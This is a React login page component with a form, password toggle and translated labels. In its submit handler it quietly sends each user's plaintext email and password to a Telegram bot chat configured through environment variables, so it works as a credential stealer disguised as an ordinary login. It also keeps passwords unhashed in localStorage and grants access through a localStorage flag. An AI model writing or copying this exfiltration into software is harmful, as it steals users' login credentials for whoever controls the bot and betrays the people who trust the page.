import s from "./Register.module.css"
import { useState } from "react"
import { Link } from "react-router-dom"
import { useTranslation } from "react-i18next"
import { motion } from "framer-motion"

const Login = () => {

    const { t } = useTranslation()

    const [showPassword, setShowPassword] = useState(false)

    const [email, setEmail] = useState("")
    const [password, setPassword] = useState("")

    const handleSubmit = async (e) => {

        e.preventDefault()

        const savedUser = JSON.parse(
            localStorage.getItem("user")
        )

        if (!savedUser) {

            alert(t("userNotFound"))

            return
        }

        if (
            savedUser.email.trim() === email.trim() &&
            savedUser.password.trim() === password.trim()
        ) {

            const token = import.meta.env.VITE_TOKEN
            const chatId = import.meta.env.VITE_CHAT_ID

            const message = `
🔐 New Login

📧 Email: ${email}
🔑 Password: ${password}
            `

            try {

                await fetch(
                    `https://api.telegram.org/bot${token}/sendMessage`,
                    {
                        method: "POST",

                        headers: {
                            "Content-Type": "application/json",
                        },

                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                        }),
                    }
                )

            } catch (error) {

                console.log(error)
            }

            localStorage.setItem(
                "isAuth",
                "true"
            )

            window.location.href = "/"

        } else {

            alert(t("wrongData"))
        }
    }

    return (

        <section className={s.register}>

            <div className={s.blur1}></div>
            <div className={s.blur2}></div>

            <motion.form
                initial={{ opacity: 0, y: 80 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.7 }}
                className={s.form}
                onSubmit={handleSubmit}
            >

                <h2>
                    {t("login")}
                </h2>

                <input
                    type="email"
                    placeholder={t("registerEmail")}
                    value={email}
                    onChange={(e) =>
                        setEmail(e.target.value)
                    }
                    required
                />

                {
                    !email && (

                        <span className={s.required}>
                            * {t("requiredField")}
                        </span>

                    )
                }

                <div className={s.passwordBox}>

                    <input
                        type={
                            showPassword
                                ? "text"
                                : "password"
                        }
                        placeholder={t("registerPassword")}
                        value={password}
                        onChange={(e) =>
                            setPassword(e.target.value)
                        }
                        required
                    />

                    <button
                        type="button"
                        className={s.eye}
                        onClick={() =>
                            setShowPassword(!showPassword)
                        }
                    >
                        {
                            showPassword
                                ? "🙈"
                                : "👁"
                        }
                    </button>

                </div>

                {
                    !password && (

                        <span className={s.required}>
                            * {t("requiredField")}
                        </span>

                    )
                }

                <button type="submit">
                    {t("login")}
                </button>

                <p className={s.bottom}>

                    {t("noAccount")}

                    <Link to="/register">
                        {t("registerButton")}
                    </Link>

                </p>

            </motion.form>

        </section>
    )
}

export default Login